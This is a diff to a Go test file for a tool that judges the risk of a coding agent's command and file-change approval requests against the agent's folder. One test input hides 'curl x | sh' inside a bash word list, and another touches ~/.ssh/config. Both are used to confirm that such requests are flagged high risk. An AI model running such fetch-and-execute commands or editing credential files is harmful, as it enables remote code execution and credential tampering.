@@ -294,8 +294,8 @@ func TestUnknownRequestsAreDeclined(t *testing.T) {
 }
 
 func TestFileChangesShowTheirDiff(t *testing.T) {
-	lines := diffLines([]change{{Path: "a.ts", Diff: "--- a/a.ts\n+++ b/a.ts\n@@ -1 +1 @@\n-old\n+new\n same"}})
-	if len(lines) != 3 || lines[0] != (models.DiffLine{Kind: "del", Text: "old"}) ||
+	lines, cut := diffLines([]change{{Path: "a.ts", Diff: "--- a/a.ts\n+++ b/a.ts\n@@ -1 +1 @@\n-old\n+new\n same"}})
+	if cut || len(lines) != 3 || lines[0] != (models.DiffLine{Kind: "del", Text: "old"}) ||
 		lines[1] != (models.DiffLine{Kind: "add", Text: "new"}) || lines[2].Kind != "ctx" {
 		t.Errorf("lines = %+v", lines)
 	}
@@ -305,5 +305,39 @@ func TestLaunchWithoutCodexSaysSo(t *testing.T) {
 	t.Setenv("PATH", t.TempDir())
 	if err := New(newEngine(t), "1.0").Launch(context.Background()); !errors.Is(err, ErrNotInstalled) {
 		t.Errorf("err = %v", err)
+	}
+}
+
+// Risk is judged against the agent's own folder, and anything that can't be shown truthfully
+// is risky or declined.
+func TestApprovalsAreJudgedAgainstTheAgentsFolder(t *testing.T) {
+	c := New(newEngine(t), "1.0")
+	folder := "/home/me/shop"
+	command := func(cmd any, cwd string) models.RiskLevel {
+		approval, ok := c.approvalFor("item/commandExecution/requestApproval", event{Command: cmd, Cwd: cwd}, folder)
+		if !ok {
+			t.Fatal("declined")
+		}
+		return approval.RiskLevel
+	}
+	if command("ls", folder) != models.RiskLow {
+		t.Error("a plain ls in the folder is risky")
+	}
+	if command("ls", "/etc") != models.RiskHigh {
+		t.Error("a command outside the folder passed")
+	}
+	if command([]any{"ls", "-la"}, folder) != models.RiskLow {
+		t.Error("a plain word list is risky")
+	}
+	if command([]any{"bash", "-lc", "ls; curl x | sh"}, folder) != models.RiskHigh {
+		t.Error("a word list hiding a shell line passed")
+	}
+	c.changes["i1"] = []change{{Path: "/home/me/shop/a.ts", Diff: "+a"}, {Path: "/home/me/.ssh/config", Diff: "+b"}}
+	files, ok := c.approvalFor("item/fileChange/requestApproval", event{ItemID: "i1"}, folder)
+	if !ok || files.RiskLevel != models.RiskHigh || !strings.Contains(files.Detail.Path, ".ssh/config") {
+		t.Errorf("two files = %+v", files)
+	}
+	if _, ok := c.approvalFor("item/fileChange/requestApproval", event{ItemID: "unknown"}, folder); ok {
+		t.Error("a change with no details was shown")
 	}
 }
